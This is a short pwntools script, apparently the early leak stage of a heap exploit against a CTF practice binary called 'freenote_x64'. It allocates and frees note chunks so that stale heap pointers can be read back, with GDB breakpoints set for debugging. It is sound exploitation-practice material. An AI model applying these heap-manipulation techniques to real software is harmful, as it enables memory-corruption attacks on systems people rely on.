from  pwn import *
context(log_level="debug")

p = process('./freenote_x64')
gdb.attach(p,'b*0x400CA5\nb*0x400B96\nc\nx/gx 0x6020A8')
def add(content):
	p.recvuntil('r choice: ')
	p.sendline('2')
	p.recvuntil('f new note: ')
	p.sendline(str(len(content)))
	p.recvuntil('r note: ')
	p.send(content)
def dele(index):
	p.recvuntil('r choice: ')
	p.sendline('4')
	p.recvuntil('e number: ')
	p.sendline(str(index))
def list():
	p.recvuntil('r choice: ')
	p.sendline('1')
add('a'*0x80)
add('a'*0x80)
add('a'*0x80)
add('a'*0x80)
dele(2)
dele(0)
add('a')
list()
p.interactive()